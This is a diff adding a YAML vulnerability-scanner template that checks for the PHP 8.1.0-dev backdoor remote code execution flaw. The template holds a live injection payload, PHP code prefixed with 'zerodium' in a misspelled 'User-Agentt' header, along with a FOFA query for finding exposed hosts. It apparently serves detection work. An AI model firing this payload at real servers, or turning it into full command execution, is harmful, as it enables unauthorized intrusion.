@@ -1,0 +1,23 @@
+id: poc-yaml-php8-1-dev-rce
+info:
+  name: PHP8.1.0-dev后门远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: php
+  fofa: header="php/8.1.0-dev"
+variables:
+  t1: random_int(1000,9999)
+  t3: md5(t1)
+requests:
+- method: GET
+  path: /
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    User-Agentt: zerodiumvar_dump(md5({{.t1}}));
+  expression: 'contains(headers,"text/html") &&
+
+    contains(body,t3)
+
+    '
+transport: http
